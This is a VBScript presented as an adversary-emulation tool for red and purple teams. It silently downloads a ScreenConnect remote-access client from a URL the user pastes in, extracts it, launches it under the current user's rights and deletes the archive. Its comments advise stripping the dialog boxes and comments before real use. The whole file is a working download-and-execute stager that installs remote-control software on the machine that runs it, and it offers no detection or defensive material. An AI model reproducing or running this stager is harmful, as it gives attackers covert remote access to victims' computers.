Option Explicit

' This script is to test the installation of a temporary support session of ScreenConnect via exe.
' It is intended for red/purple teams to test and perform adversary emulation.  
' See Readme.md for instructions. 
' This allows for potential user space exe install of ScreenConnect (still requires some UAC interaction, but works from a non-elevated launch).
' MSI variation requires more robust delivery, but provides persistence. 
' While this is easier to delivery, it is not persistent and has reduced capability. 
' For true red / purple team uses, remove the dialog boxes and comments before use. 
' Only use this script/project for legal and ethical testing scenarios.  

Dim downloadUrl, zipName, exeName, scriptFolder, zipPath, exePath
Dim fso, shell, psCommand, result

downloadUrl = "(Paste Install URL here)"
zipName = "ScreenConnect.WindowsClient.zip"
exeName = "ScreenConnect.Client.exe"

Set fso = CreateObject("Scripting.FileSystemObject")
Set shell = CreateObject("WScript.Shell")

' Get the folder where this script is running
scriptFolder = fso.GetParentFolderName(WScript.ScriptFullName)
zipPath = scriptFolder & "\" & zipName

' Download the ZIP file using PowerShell
WScript.Echo "Downloading " & zipName & "..."
psCommand = "powershell -Command ""Invoke-WebRequest -Uri '" & downloadUrl & "' -OutFile '" & zipPath & "' -UseBasicParsing"""
result = shell.Run(psCommand, 0, True)

' Check if download was successful
If Not fso.FileExists(zipPath) Or fso.GetFile(zipPath).Size = 0 Then
    WScript.Echo "Download failed. File not found or is empty."
    WScript.Quit 1
End If

WScript.Echo "Download complete. Extracting files..."

' Extract ZIP directly to current directory using PowerShell
psCommand = "powershell -Command ""Expand-Archive -Path '" & zipPath & "' -DestinationPath '" & scriptFolder & "' -Force"""
result = shell.Run(psCommand, 0, True)

' Wait for extraction to complete
WScript.Sleep 2000

' Look for the executable in the current directory
exePath = FindFileRecursive(scriptFolder, exeName)

If exePath = "" Then
    WScript.Echo "Error: " & exeName & " not found after extraction."
    WScript.Quit 1
End If

WScript.Echo "Found executable at: " & exePath
WScript.Echo "Launching application..."

' Run the executable directly (no UAC prompt, runs with current user privileges)
shell.Run """" & exePath & """", 1, False

' Clean up the ZIP file
If fso.FileExists(zipPath) Then
    fso.DeleteFile zipPath
End If

WScript.Echo "Application launched successfully."
WScript.Quit 0

' Helper function to find file recursively
Function FindFileRecursive(folder, targetName)
    Dim subfolder, file
    FindFileRecursive = ""
    
    ' Check files in current folder
    For Each file In fso.GetFolder(folder).Files
        If LCase(fso.GetFileName(file)) = LCase(targetName) Then
            FindFileRecursive = file.Path
            Exit Function
        End If
    Next
    
    ' Check subfolders
    For Each subfolder In fso.GetFolder(folder).SubFolders
        FindFileRecursive = FindFileRecursive(subfolder.Path, targetName)
        If FindFileRecursive <> "" Then Exit Function
    Next
End Function
